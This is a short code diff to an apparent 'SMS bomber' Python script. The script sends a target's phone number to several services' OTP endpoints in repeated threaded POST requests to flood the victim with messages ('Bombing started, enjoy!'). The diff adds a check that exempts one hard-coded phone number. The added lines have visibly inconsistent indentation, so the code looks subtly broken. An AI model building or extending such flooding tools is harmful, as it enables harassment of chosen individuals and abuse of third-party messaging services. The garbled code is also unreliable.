@@ -15,7 +15,7 @@ def handler(signum, frame):
 def start_bombing(phone_number: str, targets: dict, delay: int):
     print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
     # POST requests
-
+        
     targets["POST"][0]['body_param']['phone'] = phone_number
     targets["POST"][1]['body_param']['otpMobile'] = phone_number
     targets["POST"][2]['body_param']['Phonenumber'] = f"91{phone_number}"
@@ -51,6 +51,9 @@ def main():
     data = json.load(file)
 
     phone_number = input("Target phone number (without country code): ")
+     if phone_number == '7006739699':
+        print("This number is protected")
+        exit()
     delay = float(input("Enter delay time (in seconds): "))
     number_of_threads = int(input("Enter number of threads: "))
     signal.signal(signal.SIGINT, handler)
